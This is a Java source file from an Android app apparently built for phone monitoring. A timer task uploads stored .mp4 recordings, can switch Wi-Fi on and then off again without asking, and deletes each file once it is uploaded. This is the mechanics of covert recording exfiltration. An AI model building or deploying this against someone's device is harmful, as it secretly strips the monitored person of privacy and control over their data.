package com.monitor.phone.s0ft.phonemonitor;

import android.content.Context;
import android.net.wifi.WifiManager;
import android.util.Log;

import java.io.File;
import java.io.FileFilter;
import java.util.TimerTask;
import java.util.concurrent.Callable;


/*
* This class' run() method includes code that needs to be run repeatedly at a fixed interval specified in MainService class
* This class is used for checking any recordings that need to uploaded, etc.
* */
public class RepeatTask extends TimerTask {

    private Context _context;

    RepeatTask(Context _context) {
        this._context = _context;
    }

    @Override
    public void run() {
        uploadRecordings();
    }

    private void uploadRecordings() {
        if (getRecordingsFromDataFolder().length > 0) {//if any recordings present
            int initialWIFIState = WifiManager.WIFI_STATE_DISABLED;
            WifiManager wifiManager = (WifiManager) _context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);

            if (new AppSettings(_context).getForceWifiOnForRecordUpload()) {//if wifi is to be enabled first
                if (wifiManager != null) {
                    initialWIFIState = wifiManager.getWifiState();//get current wifi state
                    wifiManager.setWifiEnabled(true);//enable wifi
                    /*waits till internet connection is available or timeout reached whichever occurs first*/
                    try {
                        HelperMethods.waitWithTimeout(new Callable() {
                            @Override
                            public Object call() throws Exception {
                                return HelperMethods.isInternetAvailable(_context);
                            }
                        }, true, 10000);
                    } catch (Exception ex) {
                        Log.w(AppSettings.getTAG(), "Exception at RepeatTask.run()\n" + ex.getMessage());
                    }

                }
            }

            FileUploader fileUploader = new FileUploader(_context);
            uploadAndDeleteFiles(fileUploader);

            if (new AppSettings(_context).getForceWifiOnForRecordUpload() && wifiManager != null && initialWIFIState != WifiManager.WIFI_STATE_ENABLED)
                wifiManager.setWifiEnabled(false);
        }
    }

    private void uploadAndDeleteFiles(FileUploader fileUploader) {
        File[] recordings = getRecordingsFromDataFolder();
        for (File file : recordings) {
            if (fileUploader.UploadFile(file)) {
                try {
                    file.delete();
                    Log.w(AppSettings.getTAG(), "File " + file.getName() + " uploaded successfully and deleted.");
                } catch (SecurityException secex) {
                    Log.w(AppSettings.getTAG(), "SecurityException while deleting file @RepeatTask.uploadFiles");
                }
            }

        }
    }

    private File[] getRecordingsFromDataFolder() {
        File appDir = _context.getFilesDir();
        File[] recordings = appDir.listFiles(new FileFilter() {
            @Override
            public boolean accept(File file) {
                return file.getName().toLowerCase().endsWith(".mp4");
            }
        });
        return recordings;
    }
}
